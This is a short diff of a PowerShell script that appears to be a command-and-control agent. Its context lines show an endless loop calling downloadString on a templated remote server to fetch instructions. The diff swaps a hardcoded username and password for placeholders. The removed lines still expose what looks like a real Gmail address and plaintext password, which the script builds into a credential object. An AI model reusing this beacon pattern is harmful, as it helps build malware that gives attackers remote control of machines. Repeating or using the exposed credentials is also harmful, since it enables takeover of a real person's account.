@@ -144,8 +144,8 @@ while($true){
         $wc3.downloadString("OCU_PROTO://SRVHOST/OCTRECV");
     } else{
       try{
-        $username = "svhilimem@gmail.com"
-        $password = "123123123Vl!"
+        $username = "XXX"
+        $password = "YYY"
 
 	[SecureString]$securepassword = $password | ConvertTo-SecureString -AsPlainText -Force 
 	$credential = New-Object System.Management.Automation.PSCredential -ArgumentList $username, $securepassword
